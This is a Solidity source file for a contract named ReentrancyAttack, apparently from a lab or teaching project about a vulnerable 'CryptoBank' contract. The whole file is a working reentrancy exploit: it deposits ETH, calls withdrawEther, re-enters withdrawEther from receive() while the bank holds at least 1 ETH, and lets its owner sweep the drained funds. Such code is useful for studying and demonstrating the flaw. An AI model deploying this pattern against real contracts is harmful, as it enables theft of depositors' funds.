// SPDX-License-Identifier: MIT

pragma solidity 0.8.34;

import {ICryptoBank} from "./interfaces/ICryptoBank.sol";
import {Ownable} from "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

/**
 * @title ReentrancyAttack
 * @notice Attacker contract that drains CryptoBank by re-entering `withdrawEther`.
 */
contract ReentrancyAttack is Ownable {
    /// @notice Address of the target CryptoBank.
    address public cryptoBankAddress;

    /**
     * @notice Sets the target bank and makes the deployer the owner.
     * @param cryptoBankAddress_ Address of the CryptoBank to attack.
     */
    constructor(address cryptoBankAddress_) Ownable(msg.sender) {
        cryptoBankAddress = cryptoBankAddress_;
    }

    /**
     * @notice Starts the attack: deposits `msg.value` and triggers the first withdrawal.
     * @dev Requires at least 1 ETH (the bank's minimum deposit). Subsequent withdrawals
     *      are triggered from `receive()`.
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        ICryptoBank(cryptoBankAddress).depositEther{value: msg.value}();
        ICryptoBank(cryptoBankAddress).withdrawEther();
    }

    /**
     * @notice Re-entry point executed every time the bank sends ETH to this contract.
     * @dev Keeps calling `withdrawEther` while the bank holds at least 1 ETH.
     */
    receive() external payable {
        if (cryptoBankAddress.balance >= 1 ether) {
            ICryptoBank(cryptoBankAddress).withdrawEther();
        }
    }

    /**
     * @notice Sends all stolen ETH held by this contract to the owner.
     * @dev Only callable by the owner. Reverts if the ETH transfer fails.
     */
    function withdrawAttackedFunds() external onlyOwner {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
